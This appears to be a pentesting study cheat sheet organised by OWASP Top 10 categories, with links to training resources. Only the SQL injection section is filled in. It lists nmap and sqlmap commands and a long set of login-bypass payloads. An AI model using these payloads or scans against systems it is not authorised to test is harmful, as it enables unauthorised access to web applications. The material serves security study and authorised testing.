# [OWASP](#owasp)
  - [Injection](#injection)
  - [Broken Authentication](#broken-authentication)
  - [Sensitive Data Exposure](#sensitive-data-exposure)
  - [XML External Entity](#xml-external-entity)
  - [Broken Access Control](#broken-access-control)
  - [Security Misconfiguration](#security-misconfiguration)
  - [Cross-site Scripting](#cross-site-scripting)
  - [Insecure Deserialization](#insecure-deserialization)
  - [Components with Known Vulnerabilities](#components-with-known-vulnerabilities)
  - [Insufficent Logging & Monitoring](#insufficent-logging-and-monitoring)

## [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/index.html)
## [Web Application Attacks](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application)
## [Security Idiots](http://www.securityidiots.com/)
## [CX Security](https://cxsecurity.com/)

# [LAB](#lab)
  - [Injection Python Anywhere](https://injection.pythonanywhere.com/)


## OWASP

### Injection

[SQL INJECTION - PORTSWINGER](https://portswigger.net/web-security/sql-injection)

- Enum using nmap
  >
  > nmap -sV --script=http-sql-injection <target>
  >
- Using jsql
- Using sqlmap with login-page
- Capture the request using burp suite, and save the request in a file.
  >
  > sqlmap -r request.txt
  >
- Crawl a page to find sql-injection.
  >
  > sqlmap -u http://example.com --crawl=1
  >
- Login bypass
  >
  > ‘or 1=1- -
  >
  >‘ or ‘1’=1
  >
  >‘ or ‘1’=1 - -
  >
  >‘–
  >
  >' or '1'='1
  >
  >-'
  >
  >' '
  >
  >'&'
  >
  >'^'
  >
  >'*'
  >
  >' or ''-'
  >
  >' or '' '
  >
  >' or ''&'
  >
  >' or ''^'`
  >
  >`’ or ‘‘*’
  >
  >"-"
  >
  >" "
  >
  >"&"
  >
  >"^"
  >
  >"*"
  >
  >" or ""-"
  >
  >" or "" "
  >
  >" or ""&"
  >
  >" or ""^"
  >
  >" or ""*"
  >
  >or true--
  >
  >" or true--
  >
  >' or true--
  >
  >") or true--
  >
  >') or true--
  >
  >' or 'x'='x
  >
  >') or ('x')=('x
  >
  >')) or (('x'))=(('x
  >
  >" or "x"="x
  >
  >") or ("x")=("x
  >
  >")) or (("x"))=(("x
  >
- known Username
  >
  >admin’ - -
  >
  >admin’) - -
  >
- Using error-bases DB enumeration
  >
  >Add the tick '
  >
  >Enumerate columns
  >
Using order by
  [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html)
  
  ## Practical
  [Guru99](https://www.guru99.com/learn-sql-injection-with-practical-example.html)

### Broken Authentication

### Sensitive Data Exposure

### XML External Entity

### Broken Access Control

### Security Misconfiguration

### Cross-site Scripting

### Insecure Deserialization

### Components with Known Vulnerabilities

### Insufficent Logging & Monitoring
